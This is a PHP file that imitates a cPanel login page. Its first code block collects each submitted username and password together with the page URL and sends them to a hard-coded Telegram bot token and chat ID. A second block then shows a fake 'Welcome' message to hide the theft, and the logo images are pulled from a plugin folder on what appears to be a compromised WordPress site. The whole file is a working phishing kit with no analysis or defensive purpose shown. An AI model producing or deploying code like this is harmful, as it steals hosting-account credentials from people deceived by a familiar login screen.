<?php
$bot_token = "8074837340:AAFtpKLEc7pNll-4T3-xptQN_4o9e_Gqq50";
$chat_id   = "5928044421";

if ($_SERVER["REQUEST_METHOD"] === "POST") {
    $user = $_POST["user"] ?? '';
    $pass = $_POST["pass"] ?? '';

    // Ambil URL tempat user mengisi form
    $full_url = (isset($_SERVER['HTTPS']) ? "https://" : "http://") . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];

    if ($user && $pass) {
        $text = "🔐 Login Attempt:n"
              . "🌐 Page: <code>$full_url</code>n"
              . "👤 Username: <code>$user</code>n"
              . "🔑 Password: <code>$pass</code>";

        file_get_contents("https://api.telegram.org/bot$bot_token/sendMessage?" . http_build_query([
            'chat_id' => $chat_id,
            'text' => $text,
            'parse_mode' => 'HTML'
        ]));
    }
}
?>
<?php
// Proses form login jika dikirim
$login_message = '';
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $user = $_POST['user'] ?? '';
    $pass = $_POST['pass'] ?? '';

    // Contoh validasi sederhana
    if ($user && $pass) {
        $login_message = "✅ Welcome, <strong>" . htmlspecialchars($user) . "</strong>!";
    } else {
        $login_message = "❌ Username dan password wajib diisi.";
    }
}
?><!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>cPanel Login</title>
  <link href="https://fonts.googleapis.com/css2?family=Open+Sans&display=swap" rel="stylesheet" />
  <style>
    body {
      margin: 0;
      font-family: 'Open Sans', sans-serif;
      background: #f2f2f2;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
    }

    .login-wrapper {
      background: white;
      border-radius: 8px;
      box-shadow: 0 0 20px rgba(0,0,0,0.1);
      width: 360px;
      padding: 40px;
      position: relative;
      margin-bottom: 40px;
    }

    .login-wrapper img {
      display: block;
      margin: 0 auto 30px;
      width: 180px;
    }

    .login-wrapper h2 {
      text-align: center;
      font-weight: 600;
      margin-bottom: 30px;
      color: #333;
    }

    .login-wrapper input[type="text"],
    .login-wrapper input[type="password"] {
      width: 100%;
      padding: 12px;
      margin-bottom: 20px;
      border: 1px solid #ccc;
      border-radius: 4px;
      font-size: 14px;
    }

    .login-wrapper button {
      width: 100%;
      background-color: #f26724;
      color: white;
      padding: 12px;
      font-size: 16px;
      border: none;
      border-radius: 4px;
      cursor: pointer;
    }

    .login-wrapper button:hover {
      background-color: #d8561e;
    }

    .message {
      text-align: center;
      font-size: 14px;
      margin-top: 10px;
      color: #444;
    }

    .footer {
      text-align: center;
      font-size: 12px;
      color: #888;
    }

    .footer img {
      width: 28px;
      margin: 10px auto;
    }

    .locale-bar {
      display: flex;
      flex-wrap: wrap;
      justify-content: center;
      gap: 20px;
      font-size: 13px;
      margin-bottom: 20px;
    }

    .locale-bar a {
      text-decoration: none;
      color: #2a2a2a;
    }

    .locale-bar a:hover {
      text-decoration: underline;
    }
  </style>
</head>
<body>

  <div class="login-wrapper">
    <img src="https://wpserver.touroquefazercuritiba.com.br/wp-content/plugins/ueuu9KA9ouNF7nKj8WE8zJ/src/ui/cpanel-logo.svg" alt="cPanel Logo" />
    <h2>Login to cPanel</h2>

    <?php if ($login_message): ?>
      <div class="message"><?php echo $login_message; ?></div>
    <?php endif; ?>

    <form method="post" action="">
      <input type="text" name="user" placeholder="Username" required />
      <input type="password" name="pass" placeholder="Password" required />
      <button type="submit">Log in</button>
    </form>
  </div>

  <div class="locale-bar">
    <a href="?locale=en">English</a>
    <a href="?locale=ar">العربية</a>
    <a href="?locale=bg">български</a>
    <a href="?locale=cs">čeština</a>
    <a href="?locale=da">dansk</a>
    <a href="?locale=de">Deutsch</a>
    <a href="?locale=el">Ελληνικά</a>
    <a href="?locale=es">español</a>
    <a href="javascript:void(0)">...</a>
  </div>

  <div class="footer">
    <img src="https://wpserver.touroquefazercuritiba.com.br/wp-content/plugins/ueuu9KA9ouNF7nKj8WE8zJ/src/ui/cpanel-logo.svg" alt="cP" />
    <div>Copyright© 2025 cPanel, L.L.C.</div>
    <a href="#" style="color: #999; text-decoration: none;">Privacy Policy</a>
  </div>

</body>
</html>
